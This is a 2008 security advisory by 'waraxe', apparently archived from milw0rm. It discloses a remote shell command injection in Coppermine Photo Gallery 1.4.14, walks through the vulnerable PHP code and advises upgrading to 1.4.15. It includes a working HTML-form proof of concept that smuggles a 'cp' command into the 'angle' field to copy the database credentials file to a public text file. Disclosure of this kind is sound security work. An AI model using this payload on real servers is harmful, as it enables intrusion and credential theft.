@@ -1,0 +1,134 @@
+[waraxe-2008-SA#065] - Remote Shell Command Execution in Coppermine 1.4.14
+===============================================================================
+
+Author: Janek Vind "waraxe"
+Date: 30. January 2008
+Location: Estonia, Tartu
+Web: http://www.waraxe.us/advisory-65.html
+
+
+Target software description:
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+Coppermine Photo Gallery is a multi-purpose fully-featured and integrated web
+picture gallery script written in PHP using GD or ImageMagick as image library
+with a MySQL backend.
+
+Coppermine Photo Gallery has been tested working well on IIS, Apache 1.3.24
+onwards to the latest Apache 2, on Linux, UNIX, OSX, and Win32 systems.
+
+Vulnerabilities discovered
+===============================================================================
+
+1. Remote Shell Command Execution in "include/imageObjectIM.class.php"
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+Preconditions:
+===============
+a) ImageMagick must be set as picture processing method.
+Default Coppermine setting is GD, so many of the real-world Coppermine
+installations are probably not affected with this security issue.
+
+Impact
+===============
+An attacker is able to execute arbitrary shell commands with the privileges 
+of the web server process, such as user "nobody","apache" or "www".
+
+Caused by:
+===============
+
+Unsanitized user-submitted POST variables "quality", "angle" and "clipval".
+
+Explanation:
+===============
+
+Let's look at one of the ImageMagick wrapper functions:
+
+--------------------------------------
+function rotateImage(&$angle){
+...
+	$imgFile = escapeshellarg("$this->directory$this->filename");
+...
+	$cmd = "{$CONFIG['impath']}convert -quality {$this->quality}
+ {$CONFIG['im_options']} -rotate $angle $imgFile $imgFile";
+	exec ($cmd, $output, $retval);
+-------------------------------------
+
+As we can see, "$angle" variable is used in command line string without
+sanitize. Now who is calling out this function?
+
+"picEditor.php" ~ line 123:
+-------------------------------------
+...
+   $newimage = $_POST['newimage'];
+...
+   if ($newimage){
+      $imgObj = new imageObject($img_dir,$newimage);
+...
+      if ($imgObj->imgRes){
+...
+          if ($_POST['angle']<>0){
+                  $imgObj = $imgObj->rotateImage($_POST['angle']);
+          }
+-------------------------------------
+
+So if we deliver proper  $_POST['newimage'] and ($_POST['angle'], then
+shell command injection seems to be possible ...
+And as it was not bad enough - this script is callable by anyone!
+No proper permissions check! So anyone in world can exploit this security
+hole and run arbitrary commands against webserver's operating system!!
+There are still some mitigating factors, which will decrease danger level
+of this security hole.
+
+a) ImageMagic method is not default and most Coppermine real-word
+installations are using GD. So this specific security hole has impact only,
+if IM is used.
+
+b) $_POST array goes through anti-XSS filter first and this makes exploiting
+little bit harder. But this of course can't stop determined attacker.
+
+Proof of concept? This simple html form:
+
+[------------- PoC start --------------------------------------------------]
+<html><body><center>
+<form action="http://victim.com/cpg1414/picEditor.php" method="post">
+<input type="hidden" name="newimage" value="../../images/thumb_zip.jpg">
+<input type="hidden" name="quality" value="50">
+<input type="hidden" 
+name="angle" value="180;cp include/config.inc.php include/secret.txt;">
+<input type="submit" value="Test!">
+</form>
+</center></body></html>
+[------------- PoC end ----------------------------------------------------]
+
+Form parameters must be set as needed. "newimage" must point to existing
+image file. "include" directory must be writable for current user.
+Result - config file with database credentials will be copied to plaintext
+file and sensitive data can be viewed after this by anyone just by pointing
+webbrowser to resulting text file.
+
+How to fix:
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+Download new Coppermine version 1.4.15 as soon as possible!
+
+
+Greetings:
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+Greets to ToXiC, LINUX, y3dips, Sm0ke, Heintz, slimjim100, koko, str0ke
+and anyone else who know me!
+Greetings to Raido Kerna. Tervitusi Torufoorumi rahvale!
+
+Contact:
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+come2waraxe@yahoo.com
+Janek Vind "waraxe"
+
+Homepage: http://www.janekvind.com/
+Waraxe forum:  http://www.waraxe.us/forums.html
+
+---------------------------------- [ EOF ] --------------------------------
+
+# milw0rm.com [2008-01-30]
